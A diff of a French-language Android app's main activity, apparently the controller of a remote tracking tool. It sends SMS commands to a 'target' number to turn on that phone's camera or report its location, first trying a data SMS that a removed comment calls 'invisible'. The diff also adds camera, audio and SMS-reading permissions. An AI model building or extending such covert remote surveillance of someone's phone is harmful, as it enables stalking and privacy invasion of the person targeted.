@@ -58,7 +58,7 @@ class MainActivity : AppCompatActivity(), LocationListener {
                 val time = intent.getStringExtra("time") ?: "??:??:??"
                 Log.d(TAG, "📨 Position reçue: $lat, $lon")
                 updateMapPosition(lat, lon, time)
-                Toast.makeText(this@MainActivity, "📍 Position reçue !", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this@MainActivity, "✅ Position reçue !", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -109,35 +109,24 @@ class MainActivity : AppCompatActivity(), LocationListener {
             Toast.makeText(this, "🗑️ Historique effacé", Toast.LENGTH_SHORT).show()
         }
 
-        // 📹 DEMANDER CAMÉRA
         stream_video_btn.setOnClickListener {
             val target = targetPhoneInput.text.toString().trim()
             if (target.isBlank()) {
                 Toast.makeText(this, "⚠️ Entrez le numéro cible d'abord !", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, "⚠️ Autorisez l'envoi de SMS dans les paramètres", Toast.LENGTH_SHORT).show()
-                return@setOnClickListener
-            }
             envoyerCommande(target, "MYSAFE_CAMERA_ON")
         }
 
-        // 📍 DEMANDER POSITION
         stream_audio_btn.setOnClickListener {
             val target = targetPhoneInput.text.toString().trim()
             if (target.isBlank()) {
                 Toast.makeText(this, "⚠️ Entrez le numéro cible d'abord !", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, "⚠️ Autorisez l'envoi de SMS dans les paramètres", Toast.LENGTH_SHORT).show()
-                return@setOnClickListener
-            }
             envoyerCommande(target, "MYSAFE_SEND_POS")
         }
 
-        // 📌 CARTE FLOTTANTE
         btnFloatMap.setOnClickListener {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (Settings.canDrawOverlays(this)) {
@@ -161,17 +150,33 @@ class MainActivity : AppCompatActivity(), LocationListener {
 
     private fun requestAllPermissions() {
         val needed = mutableListOf<String>()
+        
+        // 📍 Localisation
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
         }
+        // 📩 SMS — CRUCIAL POUR LA RÉCEPTION
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
             needed.add(Manifest.permission.SEND_SMS)
         }
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
             needed.add(Manifest.permission.RECEIVE_SMS)
         }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.READ_SMS)
+        }
+        // 📹 Streaming
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.CAMERA)
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.RECORD_AUDIO)
+        }
+        
         if (needed.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQUEST_PERMISSIONS)
+        } else {
+            Toast.makeText(this, "✅ Toutes permissions déjà accordées !", Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -183,18 +188,23 @@ class MainActivity : AppCompatActivity(), LocationListener {
                 if (r != PackageManager.PERMISSION_GRANTED) allOk = false
             }
             if (allOk) {
-                Toast.makeText(this, "✅ Toutes les permissions accordées !", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "✅ TOUTES les permissions accordées ! Réception SMS active ✅", Toast.LENGTH_LONG).show()
             } else {
-                Toast.makeText(this, "⚠️ Certaines permissions sont manquantes", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "⚠️ Certaines permissions manquent — Réception SMS peut ne pas fonctionner", Toast.LENGTH_LONG).show()
             }
         }
     }
 
     private fun envoyerCommande(numero: String, commande: String) {
         Log.d(TAG, "📤 Envoi à $numero : $commande")
+        
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
+            Toast.makeText(this, "❌ Permission SEND_SMS manquante", Toast.LENGTH_SHORT).show()
+            return
+        }
+        
         try {
             val smsManager = SmsManager.getDefault()
-            // ✅ D'abord essayer en SMS de données (invisible)
             try {
                 val donnees = commande.toByteArray(Charsets.UTF_8)
                 smsManager.sendDataMessage(numero, null, 50006.toShort(), donnees, null, null)
@@ -204,7 +214,6 @@ class MainActivity : AppCompatActivity(), LocationListener {
             } catch (e: Exception) {
                 Log.w(TAG, "SMS de données impossible, essai en SMS normal", e)
             }
-            // ✅ Si échec, envoyer en SMS normal
             smsManager.sendTextMessage(numero, null, commande, null, null)
             Toast.makeText(this, "📩 Commande envoyée (SMS normal) !", Toast.LENGTH_SHORT).show()
             Log.d(TAG, "✅ SMS normal envoyé")
@@ -221,7 +230,7 @@ class MainActivity : AppCompatActivity(), LocationListener {
                     ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
             }
             if (loc == null) {
-                Toast.makeText(this, "❌ Position inconnue", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "❌ Position inconnue — activez le GPS", Toast.LENGTH_SHORT).show()
                 return
             }
             val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
